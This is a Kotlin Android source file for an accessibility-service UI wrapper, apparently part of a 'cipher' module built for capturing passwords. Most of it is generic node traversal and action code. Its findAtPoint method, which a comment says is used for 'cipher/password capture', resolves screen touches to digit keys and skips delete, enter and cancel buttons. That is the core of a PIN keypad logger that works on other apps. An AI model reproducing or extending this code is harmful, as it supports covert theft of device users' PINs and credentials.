package com.storm.safe.rock.service.modules.cipher

import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo
import java.io.Serializable

class UiObject(
    val nodeInfo: AccessibilityNodeInfo,
    val depth: Int
) : Serializable {

    companion object {
        fun createRoot(nodeInfo: AccessibilityNodeInfo?): UiObject? {
            if (nodeInfo == null) return null
            return try {
                UiObject(nodeInfo, 0)
            } catch (e: Exception) {
                null
            }
        }
    }

    private var _bounds: Rect? = null
    private var _resourceId: String? = null
    private var _text: String? = null
    private var _contentDescription: String? = null

    init {
        try {
            val rect = Rect()
            nodeInfo.getBoundsInScreen(rect)
            _bounds = rect
            nodeInfo.getBoundsInParent(Rect())
            _resourceId = nodeInfo.viewIdResourceName
            val text = nodeInfo.text
            _text = text?.toString()
            val contentDescription = nodeInfo.contentDescription
            _contentDescription = contentDescription?.toString()
            val className = nodeInfo.className
            className?.toString()
        } catch (_: Exception) {
        }
    }

    fun getBounds(): Rect? {
        val rect = _bounds
        if (rect != null) return rect
        return try {
            val newRect = Rect()
            nodeInfo.getBoundsInScreen(newRect)
            _bounds = newRect
            newRect
        } catch (_: Exception) {
            null
        }
    }

    fun getText(): String? {
        val str = _text
        if (str != null) return str
        val text = try { nodeInfo.text } catch (_: Exception) { null }
        val result = text?.toString()
        _text = result
        return result
    }

    fun getContentDescription(): String? {
        val str = _contentDescription
        if (str != null) return str
        val desc = try { nodeInfo.contentDescription } catch (_: Exception) { null }
        val result = desc?.toString()
        _contentDescription = result
        return result
    }

    fun getResourceId(): String? {
        val str = _resourceId
        if (str != null) return str
        val id = try { nodeInfo.viewIdResourceName } catch (_: Exception) { null }
        _resourceId = id
        return id
    }

    fun isVisibleToUser(): Boolean =
        try {
            nodeInfo.isVisibleToUser
        } catch (_: Exception) {
            false
        }

    fun getChild(index: Int): UiObject? {
        return try {
            val child = nodeInfo.getChild(index) ?: return null
            UiObject(child, depth + 1)
        } catch (_: Exception) {
            null
        }
    }

    fun getChildCount(): Int =
        try {
            nodeInfo.childCount
        } catch (_: Exception) {
            0
        }

    fun findFirst(predicate: (UiObject) -> Boolean): UiObject? {
        if (predicate(this)) return this
        val childCount = getChildCount()
        for (i in 0 until childCount) {
            val child = getChild(i)
            val found = child?.findFirst(predicate)
            if (found != null) return found
        }
        return null
    }

    fun findAll(predicate: (UiObject) -> Boolean, results: MutableList<UiObject>) {
        if (predicate(this)) results.add(this)
        val childCount = getChildCount()
        for (i in 0 until childCount) {
            getChild(i)?.findAll(predicate, results)
        }
    }

    // --- Actions (delegated to nodeInfo.performAction) ---

    fun click(): Boolean =
        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) { false }

    fun longClick(): Boolean =
        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_LONG_CLICK) } catch (_: Exception) { false }

    fun scrollForward(): Boolean =
        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) } catch (_: Exception) { false }

    fun scrollBackward(): Boolean =
        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD) } catch (_: Exception) { false }

    fun setText(value: String): Boolean =
        try {
            val args = android.os.Bundle()
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value)
            nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
        } catch (_: Exception) { false }

    fun focus(): Boolean =
        try { nodeInfo.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS) } catch (_: Exception) { false }

    fun isClickable(): Boolean =
        try { nodeInfo.isClickable } catch (_: Exception) { false }

    fun isScrollable(): Boolean =
        try { nodeInfo.isScrollable } catch (_: Exception) { false }

    fun getClassName(): String? =
        try { nodeInfo.className?.toString() } catch (_: Exception) { null }

    fun getParent(): UiObject? {
        return try {
            val parent = nodeInfo.parent ?: return null
            UiObject(parent, maxOf(depth - 1, 0))
        } catch (_: Exception) { null }
    }

    // --- Point-based search (vendor m211777a3) ---

    /**
     * Find deepest clickable/visible node at screen coordinates (x, y).
     * Searches children in reverse order (topmost Z-order first).
     * Used by cipher/password capture for touch point identification.
     */
    fun findAtPoint(x: Float, y: Float): UiObject? {
        val bounds = getBounds() ?: return null
        if (!bounds.contains(x.toInt(), y.toInt())) return null

        // Search children in reverse (topmost layer first)
        val count = getChildCount()
        for (i in count - 1 downTo 0) {
            val child = getChild(i) ?: continue
            val found = child.findAtPoint(x, y)
            if (found != null) return found
        }

        // Self: clickable + visible → return this
        if (isClickable() && isVisibleToUser()) return this

        // Self: visible + has meaningful content (single digit text/desc, or resource ID with digit)
        if (isVisibleToUser()) {
            val text = getText()
            val desc = getContentDescription()
            val resId = getResourceId()

            val textIsSingleDigit = text?.trim()?.length == 1 && text.trim()[0].isDigit()
            val descIsSingleDigit = desc?.trim()?.length == 1 && desc.trim()[0].isDigit()
            val resIdHasDigit = resId != null && resId.contains(":id/") &&
                !resId.contains("delete", ignoreCase = true) &&
                !resId.contains("enter", ignoreCase = true) &&
                !resId.contains("cancel", ignoreCase = true) &&
                resId.lastOrNull()?.isDigit() == true

            if (textIsSingleDigit || descIsSingleDigit || resIdHasDigit) return this
        }

        return null
    }

    // --- Equality ---

    override fun equals(other: Any?): Boolean {
        if (this === other) return true
        if (other == null || other !is UiObject) return false
        return nodeInfo == other.nodeInfo
    }

    override fun hashCode(): Int = nodeInfo.hashCode()
}
